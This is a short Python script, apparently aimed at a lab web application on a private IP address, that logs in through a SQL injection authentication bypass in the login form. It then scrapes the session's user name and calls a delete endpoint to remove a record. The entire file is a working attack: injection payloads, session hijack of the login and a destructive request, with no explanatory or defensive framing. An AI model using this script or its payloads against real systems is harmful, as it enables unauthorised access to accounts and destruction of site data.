import requests
from bs4 import BeautifulSoup

url = "http://192.168.58.144/member/login_ok.asp"
#sqlInjectList = ["'or 1=1--", "'or 1=1#"]
Form_data = {
    'id':"'or \'1\'=\'1\' --",
    'pwd':123411
}
sel = "body > table > tr:nth-of-type(2) > td:nth-of-type(1) > table > tr:nth-of-type(2) > td > table > tr > td > table > tr:nth-of-type(1) > td > b"
with requests.Session() as s:
    res_1 = s.post(url, Form_data)
    res_2 = s.get("http://192.168.58.144/")
    # print (res_2.text)
    bsObject = BeautifulSoup(res_2.text, "html.parser")
    usr = bsObject.select_one(sel)
    print ("user_name => {}".format(usr.string))

    url_ = "http://192.168.58.144/chapter1/delete.asp?w=&k=&page={p}&idx={i}".format(p=1, i=3)
    res_3 = s.get(url_)
    s.close()

